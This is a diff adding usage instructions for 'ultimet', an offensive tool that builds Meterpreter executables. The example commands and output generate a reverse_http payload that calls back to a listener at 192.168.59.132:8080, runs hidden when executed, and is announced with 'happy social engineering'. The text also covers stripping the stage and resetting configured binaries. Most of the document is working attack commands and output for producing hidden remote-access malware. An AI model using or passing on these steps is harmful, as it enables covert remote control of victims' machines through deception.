@@ -1,0 +1,36 @@
+- ultimet.exe --help
+- if you want the exe without the stage "smaller file, more noisy and no metsvc", run `ultimet.exe --remove-stage` and you'll get a new file "ultimet_no_stage.exe".
+- now you can create msfpayload-like exe:
+
+
+Example:
+c:\>ultimet.exe -t reverse_http -h 192.168.59.132 -p 8080 --msfpayload
+****************************************************
+[+] [ultimet] - The Ultimate Meterpreter Executable
+[+] v0.25.1 - Revolution
+****************************************************
+  -  http://eldeeb.net - @SheriefEldeeb
+
+[*] Switching to MSFPAYLOAD mode, parsing options ...
+        TRANSPORT       :       REVERSE_HTTP
+        LHOST           :       192.168.59.132
+        LPORT           :       8080
+[*] Success! REVERSE_HTTP-192.168.59.132-8080.exe created, happy social engineering...
+
+==============
+- this will create a new exe "reverse_http-192.168.59.132-8080.exe" that when executed, will run hidden, and requires no command line options.
+
+- You can remove the options and revert a pre-configured exe to a regular ultimet using the option `--reset`
+
+==============
+Example:
+c:\>reverse_http-192.168.59.132-8080.exe --reset
+
+****************************************************
+[+] [ultimet] - The Ultimate Meterpreter Executable
+[+] v0.25.1 - Revolution
+****************************************************
+  -  http://eldeeb.net - @SheriefEldeeb
+
+[*] Creating a `clean` ultimet copy with all options reset to default ...
+[*] Success! use `ultimet_reset.exe` for a fresh start...
